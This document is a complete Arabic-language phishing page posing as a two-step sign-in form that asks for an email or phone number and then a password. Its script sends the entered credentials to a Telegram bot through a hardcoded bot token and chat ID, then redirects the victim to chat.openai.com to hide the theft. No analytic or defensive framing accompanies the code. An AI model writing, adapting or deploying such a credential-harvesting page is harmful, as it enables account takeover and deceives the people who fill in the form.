<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>نموذج إرسال البيانات</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Tahoma', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSq19yICTWAbF0PgoNE2Iq5KE58cYS2ySo7-C5TSZVZypdg4KvLTTC8hmRv&s=10") no-repeat center center fixed;
      background-size: cover;
    }

    .form-container {
      background: rgba(255, 255, 255, 0.92);
      padding: 30px 25px;
      border-radius: 16px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.15);
      width: 320px;
      text-align: right;
    }

    h2 {
      margin-bottom: 20px;
      color: #333;
      text-align: center;
    }

    .input-group {
      position: relative;
      margin-bottom: 20px;
    }

    .input-group input {
      width: 100%;
      padding: 10px 0 8px 0;
      font-size: 16px;
      border: none;
      border-bottom: 2px solid #ccc;
      background: transparent;
      outline: none;
    }

    .input-group label {
      position: absolute;
      right: 0;
      top: 10px;
      color: #777;
      font-size: 16px;
      pointer-events: none;
      transition: 0.2s ease all;
    }

    .input-group input:focus {
      border-bottom: 2px solid #1a73e8;
    }

    .input-group input:focus + label,
    .input-group input:not(:placeholder-shown) + label {
      top: -10px;
      font-size: 12px;
      color: #1a73e8;
    }

    button {
      background-color: #1a73e8;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      width: 100%;
      margin-top: 10px;
    }

    button:disabled {
      background-color: #aaa;
      cursor: not-allowed;
    }

    .status {
      margin-top: 15px;
      color: #555;
      font-size: 14px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="form-container" id="formBox">
    <h2>تسجيل الدخول</h2>
    <div class="input-group">
      <input type="email" id="email" placeholder=" " required>
      <label for="email">البريد الإلكتروني أو الهاتف</label>
    </div>
    <button onclick="goToPassword()">التالي</button>
    <div class="status" id="status"></div>
  </div>

  <script>
    function goToPassword() {
      const email = document.getElementById("email").value.trim();
      if (!email) {
        document.getElementById("status").textContent = "يرجى إدخال البريد.";
        return;
      }

      document.getElementById("formBox").innerHTML = `
        <h2>مرحبا ${email}</h2>
        <div class="input-group">
          <input type="password" id="password" placeholder=" " required>
          <label for="password">أدخل كلمة المرور</label>
        </div>
        <button onclick="sendData('${email}')">تسجيل الدخول</button>
        <div class="status" id="status"></div>
      `;
    }

    function sendData(email) {
      const password = document.getElementById("password").value.trim();
      const statusEl = document.getElementById("status");

      if (!password) {
        statusEl.textContent = "يرجى إدخال كلمة المرور.";
        return;
      }

      statusEl.textContent = "جارٍ الإرسال...";

      const message = `📥 بيانات تسجيل:\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;
      const token = "8185557975:AAEDUZuAvskBZTTvSqyHKfcVuR3CfoRjp3U";
      const chat_id = "6894787120";
      const url = \`https://api.telegram.org/bot\${token}/sendMessage?chat_id=\${chat_id}&text=\${encodeURIComponent(message)}\`;

      fetch(url)
        .then(res => {
          if (!res.ok) throw new Error("فشل الاتصال");
          statusEl.textContent = "✅ تم الإرسال بنجاح! يتم التحويل...";
          setTimeout(() => {
            window.location.href = "https://chat.openai.com";
          }, 1500);
        })
        .catch(err => {
          statusEl.textContent = "❌ فشل في الإرسال.";
          console.error(err);
        });
    }
  </script>
</body>
</html>
